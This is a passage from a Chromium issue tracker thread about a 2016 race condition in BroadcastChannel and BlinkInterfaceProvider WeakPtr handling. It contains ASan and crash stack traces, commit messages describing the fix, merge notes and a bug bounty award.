  0x3566fa20: fa fa 04 fa fa fa fd fa fa fa fd fd fa fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==34308==ABORTING
eax=00000000 ebx=777fa920 ecx=0089018d edx=00000000 esi=00000001 edi=00000000
eip=77766e9c esp=006fcf84 ebp=006fd05c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
ntdll!NtTerminateProcess+0xc:
77766e9c c20800          ret     8
3:070> g


### sh...@chromium.org (2016-11-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-02)

>> How did you covert the test case to clusterfuzz?
I stood up a test server with the node script and pointed clusterfuzz at it. (It's no longer running, so any re-runs of the clusterfuzz job won't work)

### es...@chromium.org (2016-11-02)

No response from peter@, so I'm reassigning to alexclarke@: it looks like you've done some work in this area recently; do you think you might be able to take a look at this and/or help find an appropriate owner?

### pe...@chromium.org (2016-11-03)

This thread decisively ended up in my spam folder, sorry about that and thanks for the ping, Alex! Please IM me if something like this happens.

While the problem is straightforward, I can't see a straightforward solution. I'll have a look today.

### pe...@chromium.org (2016-11-03)

[1:2923:1103/180703:FATAL:ref_counted.cc(32)] Check failed: !in_dtor_. 
#0 0x7f3bca8d3da1 __interceptor_backtrace
#1 0x7f3bd027f133 base::debug::StackTrace::StackTrace()
#2 0x7f3bd02cecba logging::LogMessage::~LogMessage()
#3 0x7f3bd02dd875 base::subtle::RefCountedThreadSafeBase::AddRef()
#4 0x7f3bdb0bbe7e base::WeakPtrFactory<>::GetWeakPtr()
#5 0x7f3bdb0bba7d content::BlinkInterfaceProviderImpl::getInterface()
#6 0x7f3bda0af230 blink::BroadcastChannel::BroadcastChannel()
#7 0x7f3bda0ac980 blink::BroadcastChannel::create()
#8 0x7f3bd9a7f5f3 blink::V8BroadcastChannel::constructorCallback()
#9 0x7f3bcb55f857 v8::internal::FunctionCallbackArguments::Call()
#10 0x7f3bcb74a2bf v8::internal::(anonymous namespace)::HandleApiCallHelper<>()
#11 0x7f3bcb74828c v8::internal::Builtin_Impl_HandleApiCall()
#12 0x7f3bcb747503 v8::internal::Builtin_HandleApiCall()
#13 0x7f399d3843a7 <unknown>

Received signal 6
#0 0x7f3bca8d3da1 __interceptor_backtrace
#1 0x7f3bd027e1c7 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#2 0x7f3bc0397330 <unknown>
#3 0x7f3bbd3f5c37 gsignal
#4 0x7f3bbd3f9028 abort
#5 0x7f3bd027be4a base::debug::BreakDebugger()
#6 0x7f3bd02cf22b logging::LogMessage::~LogMessage()
#7 0x7f3bd02dd875 base::subtle::RefCountedThreadSafeBase::AddRef()
#8 0x7f3bdb0bbe7e base::WeakPtrFactory<>::GetWeakPtr()
#9 0x7f3bdb0bba7d content::BlinkInterfaceProviderImpl::getInterface()
#10 0x7f3bda0af230 blink::BroadcastChannel::BroadcastChannel()
#11 0x7f3bda0ac980 blink::BroadcastChannel::create()
#12 0x7f3bd9a7f5f3 blink::V8BroadcastChannel::constructorCallback()
#13 0x7f3bcb55f857 v8::internal::FunctionCallbackArguments::Call()
#14 0x7f3bcb74a2bf v8::internal::(anonymous namespace)::HandleApiCallHelper<>()
#15 0x7f3bcb74828c v8::internal::Builtin_Impl_HandleApiCall()
#16 0x7f3bcb747503 v8::internal::Builtin_HandleApiCall()
#17 0x7f399d3843a7 <unknown>
  r8: 000000008fff6fff  r9: 0000000000000000 r10: 0000000000000008 r11: 0000000000000202
 r12: 00007f3a0c25bae0 r13: 0000000000000000 r14: 00007f3a0c25b800 r15: 00007f3a0c0eb020
  di: 0000000000000001  si: 0000000000000b6b  bp: 00007f3b66efca70  bx: 00007f3b66efca80
  dx: 0000000000000006  ax: 0000000000000000  cx: ffffffffffffffff  sp: 00007f3b66efc938
  ip: 00007f3bbd3f5c37 efl: 0000000000000202 cgf: 0000000000000033 erf: 0000000000000000
 trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]

### pe...@chromium.org (2016-11-03)

I uploaded a CL that fixes the crash here:
    https://codereview.chromium.org/2476543003/

What I don't know is whether the approach is correct, so I've asked Nasko and Alex to either give it a look or help me find the right person.

### al...@chromium.org (2016-11-04)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-11-07)

**** Bulk edit -  please ignore if not applicable ****

A friendly reminder that M55 Stable is launch is coming soon! Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and get it merged into the release branch ASAP so it gets enough baking time in Beta (before Stable promotion). Thank you!

Also due to Thanksgiving holidays in US, please make sure all fixes are ready and merged to M55 latest by 5:00 PM PT Friday, 11/18/16.

### bu...@chromium.org (2016-11-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c6f247ed04bc2e28157968a9f7e8f195012ae614

commit c6f247ed04bc2e28157968a9f7e8f195012ae614
Author: peter <peter@chromium.org>
Date: Tue Nov 08 18:30:30 2016

Create and use BlinkInterfaceProvider WeakPtrs on the same thread

A race condition seems to be occurring where the reference to
WeakReference::Flag in WeakReferenceOwner is in process of being destroyed
while a new reference is being added. This happens when a document having
Web Workers is being destroyed (due to a reload) while, on the thread
specific to a worker, an API is used that binds to a Mojo Interface
Provider.

Creating the weak pointers on arbitrary threads, even though they
consistently get dereferenced on the main thread, seems to be unsafe
in this situation.

Instead, create a single WeakPtr<> on the main thread during construction,
a copy of which can be made on the worker threads. This will increase the
reference count of the WeakReference::Flag, which is a thread-safe ref
counted object.

BUG=649645

Review-Url: https://codereview.chromium.org/2476543003
Cr-Commit-Position: refs/heads/master@{#430663}

[modify] https://crrev.com/c6f247ed04bc2e28157968a9f7e8f195012ae614/content/renderer/mojo/blink_interface_provider_impl.cc
[modify] https://crrev.com/c6f247ed04bc2e28157968a9f7e8f195012ae614/content/renderer/mojo/blink_interface_provider_impl.h


### pe...@chromium.org (2016-11-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-09)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### di...@chromium.org (2016-11-09)

Your change meets the bar and is auto-approved for M55 (branch: 2883)

### sh...@chromium.org (2016-11-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-11-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6ceee1c6e0069fa9a5d9f972cbc1d5fe792b475b

commit 6ceee1c6e0069fa9a5d9f972cbc1d5fe792b475b
Author: Peter Beverloo <peter@chromium.org>
Date: Thu Nov 10 22:26:18 2016

Create and use BlinkInterfaceProvider WeakPtrs on the same thread

A race condition seems to be occurring where the reference to
WeakReference::Flag in WeakReferenceOwner is in process of being destroyed
while a new reference is being added. This happens when a document having
Web Workers is being destroyed (due to a reload) while, on the thread
specific to a worker, an API is used that binds to a Mojo Interface
Provider.

Creating the weak pointers on arbitrary threads, even though they
consistently get dereferenced on the main thread, seems to be unsafe
in this situation.

Instead, create a single WeakPtr<> on the main thread during construction,
a copy of which can be made on the worker threads. This will increase the
reference count of the WeakReference::Flag, which is a thread-safe ref
counted object.

BUG=649645

Review-Url: https://codereview.chromium.org/2476543003
Cr-Commit-Position: refs/heads/master@{#430663}
(cherry picked from commit c6f247ed04bc2e28157968a9f7e8f195012ae614)

Review URL: https://codereview.chromium.org/2492833003 .

Cr-Commit-Position: refs/branch-heads/2883@{#526}
Cr-Branched-From: 614d31daee2f61b0180df403a8ad43f20b9f6dd7-refs/heads/master@{#423768}

[modify] https://crrev.com/6ceee1c6e0069fa9a5d9f972cbc1d5fe792b475b/content/renderer/mojo/blink_interface_provider_impl.cc
[modify] https://crrev.com/6ceee1c6e0069fa9a5d9f972cbc1d5fe792b475b/content/renderer/mojo/blink_interface_provider_impl.h


### aw...@chromium.org (2016-11-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-18)

[Empty comment from Monorail migration]

### aw...@google.com (2016-11-18)

Congratulations, $1,000 for this report!

### aw...@google.com (2016-11-18)

[Empty comment from Monorail migration]

### lo...@gmail.com (2016-11-24)

Thanks. 
Is there any reason that the reward amount is 1000 instead of 3000 for this Severity-High memory corruption bug? If you can add a comment explain the reasoning behind that decision, then I may be able to improve the report quality next time. 

### sh...@chromium.org (2017-02-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-02-16)

This issue was migrated from crbug.com/chromium/649645?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Messaging, Internals>Mojo]
[Monorail blocking: crbug.com/chromium/661927]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085492)*
